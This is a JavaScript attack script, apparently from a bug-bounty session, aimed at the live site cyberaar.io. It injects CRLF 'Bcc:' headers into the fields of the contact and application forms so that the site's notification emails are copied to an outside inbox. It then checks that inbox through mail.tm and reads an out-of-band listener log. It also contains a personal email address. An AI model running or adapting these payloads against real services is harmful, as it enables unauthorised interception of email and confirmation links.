// CYBERAAR : injection CRLF dans les champs des formulaires (actif Standard)
// But : un \r\nBcc: dans un champ -> l email de notification que le vendor s'envoie part-il
// avec mon adresse en copie ? (capture de la notification, y compris un eventuel lien de confirmation)
// Surveillance : ma boite mail (mail.tm) + le tunnel OOB (pour un eventuel rappel HTTP)
import fs from "fs";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const INBOX = "bbtest4926@maxxspace.com";
const ME = "vianney24lechancelier+bb1@gmail.com"; // adresse reelle (gmail) acceptee par leur filtre
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function post(url, body) {
  for (let i = 0; i < 4; i++) {
    try {
      const t0 = Date.now();
      const r = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, Origin: new URL(url).origin, Referer: new URL(url).origin + "/" }, body: JSON.stringify(body), redirect: "manual", signal: AbortSignal.timeout(25000) });
      return { s: r.status, ms: Date.now() - t0, txt: await r.text() };
    } catch (e) { await sleep(3000); }
  }
  return { s: 0, ms: 0, txt: "ERR" };
}
const show = (l, r) => console.log("  " + l.padEnd(50) + "HTTP " + r.s + " " + String(r.ms).padStart(5) + "ms  " + r.txt.replace(/\s+/g, " ").slice(0, 160));

console.log("=== A) POST https://cyberaar.io/api/contact ===");
const CRLF = "Test CyberAar\r\nBcc: " + INBOX;
const CASES_A = [
  ["nominal (controle)", { name: "Test CyberAar", email: ME, subject: "Test programme", message: "Test de la surface CyberAar - rapport de bug bounty. Message de controle." }],
  ["CRLF dans name", { name: CRLF, email: ME, subject: "Test programme", message: "Test CRLF name CyberAar - rapport de bug bounty." }],
  ["CRLF dans subject", { name: "Test CyberAar", email: ME, subject: CRLF, message: "Test CRLF subject CyberAar - rapport de bug bounty." }],
  ["CRLF dans email (en-tete To:)", { name: "Test CyberAar", email: ME + "\r\nBcc: " + INBOX, subject: "Test programme", message: "Test CRLF email CyberAar - rapport de bug bounty." }],
  ["CRLF dans message", { name: "Test CyberAar", email: ME, subject: "Test programme", message: "Test\r\nBcc: " + INBOX + "\r\n\r\nCyberAar - test d injection d en-tete" }],
];
for (const [l, b] of CASES_A) { show(l, await post("https://cyberaar.io/api/contact", b)); await sleep(20000); }

console.log("\n=== B) POST https://cyberaar.io/api/apply (proposition d organisation) ===");
const CASES_B = [
  ["nominal (controle)", { org: "BB Probe Org", sector: "Technologies / SaaS", email: ME, message: "Test de la surface CyberAar - rapport de bug bounty." }],
  ["CRLF dans org", { org: CRLF, sector: "Technologies / SaaS", email: ME, message: "Test CRLF org CyberAar - rapport de bug bounty." }],
  ["CRLF dans message", { org: "BB Probe Org", sector: "Technologies / SaaS", email: ME, message: "Test\r\nBcc: " + INBOX + "\r\n\r\nCyberAar - test d injection d en-tete" }],
];
for (const [l, b] of CASES_B) { show(l, await post("https://cyberaar.io/api/apply", b)); await sleep(20000); }

console.log("\n=== C) ma boite : une notification (avec Bcc) est-elle arrivee ? ===");
try {
  const tok = fs.readFileSync("/tmp/opencode/mail_token.txt", "utf8").trim();
  const r = await fetch("https://api.mail.tm/messages", { headers: { Authorization: "Bearer " + tok } });
  const j = await r.json();
  const msgs = Array.isArray(j) ? j : (j["hydra:member"] || []);
  console.log("  " + msgs.length + " message(s) :");
  for (const m of msgs.slice(0, 10)) console.log("    - " + (m.from?.address || "?") + " | " + (m.subject || "").slice(0, 90) + " | " + (m.createdAt || ""));
} catch (e) { console.log("  (boite inaccessible: " + e.message.slice(0, 60) + ")"); }
console.log("\n=== D) l OOB a-t-il recu un rappel ? (un rappel automatique vers mon URL) ===");
try { console.log(fs.readFileSync("/tmp/opencode/cyberaar/probe-listener.log", "utf8").trim().split("\n").slice(-5).join("\n")); } catch { console.log("  (rien)"); }
